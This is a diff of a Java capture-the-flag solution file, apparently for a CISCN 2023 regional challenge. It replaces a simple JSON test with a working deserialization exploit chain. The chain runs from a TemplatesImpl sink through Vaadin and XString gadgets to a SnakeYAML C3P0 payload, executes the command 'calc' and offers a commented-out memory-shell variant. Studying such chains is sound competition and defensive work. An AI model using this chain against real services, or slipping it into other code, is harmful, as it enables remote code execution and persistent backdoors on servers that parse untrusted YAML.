@@ -1,19 +1,34 @@
 package dev.silente.javashark.solution;
 
-import cn.hutool.json.JSONObject;
-import dev.silente.javashark.utils.TestUtils;
+import dev.silente.javashark.gadget.c3p0.GPoolDataSource;
+import dev.silente.javashark.gadget.jdk.GXString;
+import dev.silente.javashark.gadget.vaadin.GNestedMethodProperty;
+import dev.silente.javashark.poc.SnakeYamlWays;
+import dev.silente.javashark.sink.jdk.STemplates;
+import dev.silente.javashark.utils.MiscUtils;
+import dev.silente.javashark.utils.SerializeUtils;
 
 import java.lang.reflect.Constructor;
 
+/* 华北赛区 Java 题 */
 public class CISCN2023 {
-    public static void main(String[] args) {
-        Myexpect myexpect = new Myexpect();
-        myexpect.setTargetclass(TestUtils.class);
-        JSONObject jsonObject = new JSONObject();
-        jsonObject.put("foo", myexpect);
-        System.out.println("--------");
+    public static void main(String[] args) throws Exception {
 
-        jsonObject.toString();
+        // 1 cmd
+        Object exp = STemplates.createTemplatesImpl("calc");
+
+        // 2 memshell
+//        Object exp = STemplates.getEvilTemplates(MiscUtils.classAsBytes(Evil.class));
+
+        Object property = GNestedMethodProperty.toString2Getter(exp);
+        Object xstring = GXString.deserialize2ToString(property);
+        String hexstr = MiscUtils.bytes2HexString(SerializeUtils.serialize(xstring));
+        String poc = SnakeYamlWays.C3P0PoolDataSource(hexstr);
+
+        System.out.println(poc);
+
+        // test
+        SnakeYamlWays.load(poc);
     }
 }
 
